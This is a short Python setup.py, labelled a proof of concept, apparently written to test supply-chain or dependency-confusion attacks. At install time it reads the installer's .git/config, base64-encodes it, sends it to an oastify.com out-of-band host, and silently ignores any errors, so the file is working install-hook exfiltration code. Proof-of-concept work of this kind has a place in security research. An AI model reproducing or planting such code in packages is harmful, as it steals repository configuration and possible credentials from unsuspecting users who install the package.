import base64
import urllib.request

# POC: Exfiltrate .git/config
try:
    with open(".git/config") as f:
        data = base64.b64encode(f.read().encode()).decode()
    urllib.request.urlopen(
        "https://5w2uc5a9fpgknip5li2pqztgs7yymrag.oastify.com/pip/" + data[:100]
    )
except:
    pass

from setuptools import setup

setup(name="poc")
